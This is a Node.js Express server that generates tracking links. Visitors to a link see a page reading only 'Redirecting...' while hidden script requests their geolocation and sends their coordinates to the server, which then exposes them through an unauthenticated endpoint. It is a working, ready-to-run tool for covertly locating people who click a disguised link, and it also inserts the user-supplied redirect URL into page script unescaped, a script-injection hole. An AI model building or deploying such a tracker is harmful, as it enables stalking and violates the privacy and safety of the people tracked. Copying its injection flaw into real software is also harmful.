const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors());

const PORT = 3000;

let trackingLinks = {}; // Store tracking links and their metadata
let userLocations = {}; // Store user locations based on tracking ID

// Endpoint to create a tracking link
app.post('/create-link', (req, res) => {
    const { redirectUrl } = req.body;
    const trackingId = uuidv4();
    trackingLinks[trackingId] = { redirectUrl };
    res.json({ trackingUrl: `http://localhost:${PORT}/track/${trackingId}` });
});

// Endpoint to handle tracking
app.get('/track/:trackingId', (req, res) => {
    const { trackingId } = req.params;
    if (!trackingLinks[trackingId]) {
        return res.status(404).send('Tracking link not found');
    }
    res.send(`
        <html>
            <body>
                <script>
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(position => {
                            fetch('http://localhost:${PORT}/location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    trackingId: '${trackingId}',
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                })
                            });
                        });
                    }
                    setTimeout(() => {
                        window.location.href = '${trackingLinks[trackingId].redirectUrl}';
                    }, 3000);
                </script>
                <h1>Redirecting...</h1>
            </body>
        </html>
    `);
});

// Endpoint to receive user location
app.post('/location', (req, res) => {
    const { trackingId, latitude, longitude } = req.body;
    if (!userLocations[trackingId]) {
        userLocations[trackingId] = [];
    }
    userLocations[trackingId].push({ latitude, longitude, timestamp: new Date() });
    res.sendStatus(200);
});

// Endpoint to get user locations
app.get('/locations/:trackingId', (req, res) => {
    const { trackingId } = req.params;
    res.json(userLocations[trackingId] || []);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
